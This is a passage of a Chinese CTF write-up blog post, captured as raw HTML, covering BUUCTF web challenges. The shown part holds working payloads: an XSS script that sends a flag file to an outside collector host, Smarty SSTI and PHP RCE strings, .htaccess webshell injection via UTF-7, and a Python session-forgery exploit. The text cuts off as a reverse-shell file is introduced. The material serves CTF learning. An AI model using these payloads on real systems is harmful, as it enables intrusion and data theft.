<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUU WEB 刷题笔记6"><meta name="keywords" content=""><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>BUU WEB 刷题笔记6 | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Hurdles"><span class="toc-number">1.</span> <span class="toc-text">[BSidesCF 2020]Hurdles</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2019-Cloud2Clown"><span class="toc-number">2.</span> <span class="toc-text">[BSidesCF 2019]Cloud2Clown</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-number">3.</span> <span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]RCE ME####</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XNUCA2019Qualifier-EasyPHP"><span class="toc-number">5.</span> <span class="toc-text">[XNUCA2019Qualifier]EasyPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">6.</span> <span class="toc-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-Easy-Notes"><span class="toc-number">7.</span> <span class="toc-text">[HarekazeCTF2019]Easy Notes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WUSTCTF2020-easyweb"><span class="toc-number">8.</span> <span class="toc-text">[WUSTCTF2020]easyweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">9.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#b01lers2020-Welcome-to-Earth"><span class="toc-number">10.</span> <span class="toc-text">[b01lers2020]Welcome to Earth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#b01lers2020-Life-on-Mars"><span class="toc-number">11.</span> <span class="toc-text">[b01lers2020]Life on Mars</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-mypassword"><span class="toc-number">12.</span> <span class="toc-text">[GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="toc-number">13.</span> <span class="toc-text">[GWCTF 2019]你的名字</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-blog"><span class="toc-number">14.</span> <span class="toc-text">[GWCTF 2019]blog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#b01lers2020-Scrambled"><span class="toc-number">15.</span> <span class="toc-text">[b01lers2020]Scrambled</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-True-XML-cookbook"><span class="toc-number">16.</span> <span class="toc-text">[NCTF2019]True XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF-2019-homebrew-event-loop"><span class="toc-number">17.</span> <span class="toc-text">[DDCTF 2019]homebrew event loop</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">58</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">52</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">BUU WEB 刷题笔记6</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-01</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.1k</span><span class="post-meta__separator">|</span><span>Reading time: 23 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h1><p>一道神仙题…. 把HTTP header 里面能搞的东西都搞了一遍,,, 我直接用的Postman 比较方便, 虽然curl 也可以… 但是既然有工具为什么不用嘛(SB警告!)</p>
<p><strong>跟着题目的引导一步一步去做, 去搜索, 善于利用Google</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200404011604.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200404011603.png"></p>
<p>flag 在heads中的 <strong>X-Ctf-Flag</strong></p>
<h1 id="BSidesCF-2019-Cloud2Clown"><a href="#BSidesCF-2019-Cloud2Clown" class="headerlink" title="[BSidesCF 2019]Cloud2Clown"></a>[BSidesCF 2019]Cloud2Clown</h1><p>题目存在robotx.txt </p>
<p>当访问/hack 时 跳转到了一篇文章 : <a target="_blank" rel="noopener" href="https://systemoverlord.com/">https://systemoverlord.com/</a> …. 我傻了 看了博客的第一篇文章看了半天, 结果发现这是最新的一篇文章 0,0 最后在博客里找到了wp</p>
<p>考点</p>
<ul>
<li>Recon =&gt; robotx.txt</li>
<li>SSRF</li>
<li>XSS</li>
</ul>
<p>SSRF =&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1:8801/status">http://127.0.0.1:8801/status</a> 得到flag1</p>
<p>flag2 要xss .. 没打通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#39;&#x2F;flag.txt&#39;, &#123;mode: &#39;no-cors&#39;&#125;).then(function(r) &#123;</span><br><span class="line">  r.text().then(function(f) &#123;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; &#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;do&#x2F;auth&#x2F;a13dce9419a9fb8f5001553f2a644b94&#x2F;&#39; + btoa(f);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>







<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><ul>
<li>PHP Smarty 模板引擎 ]</li>
<li>XFF </li>
<li>SSTI</li>
</ul>
<p>打开题目 可以看到是 Current IP : xxxx.x..x.x.xc.a.a.  是被打印出来的. 并且题目的API Usage 中存在XFF 而且 XFF 我们是随意可控的</p>
<p>用hacker 修改一下XFF, 随便改一下, 将我们输入的返回了 , 试一下<code>&#123;&#123;config&#125;&#125;</code> 发现报错了 , 不是python 的ssti , 是php 的 </p>
<p><a target="_blank" rel="noopener" href="https://www.smarty.net/docs/zh_CN/language.variables.smarty.tpl#language.variables.smarty.version">https://www.smarty.net/docs/zh_CN/language.variables.smarty.tpl#language.variables.smarty.version</a></p>
<p>payload </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/oubasangdadada/article/details/104607777/">https://blog.csdn.net/oubasangdadada/article/details/104607777/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/eb8d0137a7d3">https://www.jianshu.com/p/eb8d0137a7d3</a></p>
<blockquote>
<p>在Smarty3的官方手册里有以下描述:</p>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<blockquote>
<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||<em>,<em>or</em>,</em>&amp;&amp;*,<em>and</em>,<em>is_array()</em>, 等等</p>
</blockquote>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME####"></a>[极客大挑战 2019]RCE ME####</h1><ul>
<li>无字母RCE. 绕过disable_funciton getshell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>



<h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file); <span class="comment">// 判断file , 不是index 就删除</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>); <span class="comment">// (事实证明,这是有大用滴)</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (stristr($content, <span class="string">&#x27;on&#x27;</span>) || stristr($content, <span class="string">&#x27;html&#x27;</span>) || stristr($content, <span class="string">&#x27;type&#x27;</span>) || stristr($content, <span class="string">&#x27;flag&#x27;</span>) || stristr($content, <span class="string">&#x27;upload&#x27;</span>) || stristr($content, <span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123; <span class="comment">// 文件名开头不能出现a-z 以及.</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); <span class="comment">// ./ 表示当前目录</span></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// 又来一次文件判断, 不是index 就删除, 那么这里用条件竞争来绕过即可</span></span><br><span class="line">file_put_contents($filename, $content . <span class="string">&quot;\nJust one chance&quot;</span>); <span class="comment">// 把content 写入 filename 中的文件</span></span><br><span class="line"> <span class="comment">// 思路很清楚了, 大概就是写个webshell 然后 getshell  flag 在根目录下面这种样子</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>…. 我太天真了, 因为我这个思路不管怎么搞都绕不过 看WP 才知道这道题不简单!</p>
<p><a target="_blank" rel="noopener" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12296896.html">https://www.cnblogs.com/wangtanzhi/p/12296896.html</a></p>
<p>知识点: </p>
<ul>
<li>利用文件包含一个不存在的文件 配合error_log 在 include_path 在tmp目录下生成shell</li>
<li>UTF-7 编码 绕过html实体 执行shell</li>
<li>.htaccess 中的注释符 #  , 来注释掉换行符</li>
</ul>
<p>核心要点: </p>
<ul>
<li><strong>error_log可以将php运行报错的记录写到指定文件中</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;tmp&#x2F;fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;&#x2F;tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>

<p>非预期1 :</p>
<p>既然<code>\</code> 可以用来转义换行符, 那就这道题来说, 为什么不用来连接上下文来绕过过滤?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>

<p>非预期2 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>

<p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123;</code>而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0) &#123;</code>，因此存在了被绕过的可能。 通过设置.htaccess</p>
<p>导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。</p>
<p>这道题不做过多研究, 遇到类似直接拿payload 打 , 抽空看看php手册</p>
<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><p>题目源码: (qurey.php 的源码)</p>
<ul>
<li>编码绕过(最近遇到好多编码绕过的题)</li>
<li>php://filter 伪协议</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $banword = [</span><br><span class="line">        <span class="comment">// no path traversal</span></span><br><span class="line">        <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">        <span class="comment">// no stream wrapper</span></span><br><span class="line">        <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">        <span class="comment">// no data exfiltration</span></span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment">// 正则</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match($regexp, $str)) &#123; <span class="comment">// 相当于存在一个黑名单</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// 接收POST 的数据</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    $content = file_get_contents($page); <span class="comment">// 文件操作函数, 接收post的数据</span></span><br><span class="line">    <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">        $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>payload: </p>
<p>用php 伪协议来读取base64 的形式的flag , 从而来绕过黑名单中的flag, 对php 采用json 逃脱字符处理即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>一句话小总结: <strong>编码绕过在Web中挺常用的</strong></p>
<p><a target="_blank" rel="noopener" href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-100-encode--encode">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-100-encode--encode</a></p>
<p>为什么这里直接读<code>/flag</code> 因为原题是有附件的, 在Dokerfile 中得到的</p>
<p>在JSON <code>&#39;\uXXXX&#39;</code>能够逃脱字符，如，例如，<code>&#39;A&#39;</code>和<code>&#39;\u0041&#39;</code>是相等的。</p>
<h1 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h1><p>原题是给了源代码的</p>
<p><a target="_blank" rel="noopener" href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-200-easy-notes">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-200-easy-notes</a></p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://e808d328-ee1f-4a90-a863-b7bc335e3ab7.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># login as sess_</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.post(URL + <span class="string">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sess_&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a crafted note</span></span><br><span class="line">    sess.post(URL + <span class="string">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a fake session</span></span><br><span class="line">    r = sess.get(URL + <span class="string">&#x27;export.php?type=.&#x27;</span>).headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">    sessid = re.findall(<span class="string">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    r = requests.get(URL + <span class="string">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">    &#125;).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag = re.findall(<span class="string">r&#x27;flag\&#123;.+\&#125;&#x27;</span>, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(flag) &gt; <span class="number">0</span>:</span><br><span class="line">        print(flag[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>去GitHub上下下来分析一波</p>
<h1 id="WUSTCTF2020-easyweb"><a href="#WUSTCTF2020-easyweb" class="headerlink" title="[WUSTCTF2020]easyweb"></a>[WUSTCTF2020]easyweb</h1><p>当时在WUSTCTF的平台复现被阿里云拦截了IP, 在buu 复现一下</p>
<p>知识点就是</p>
<ul>
<li>tomcat ajp 幽灵猫任意文件包含漏洞 然后getshell</li>
</ul>
<p>反弹shell.asp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 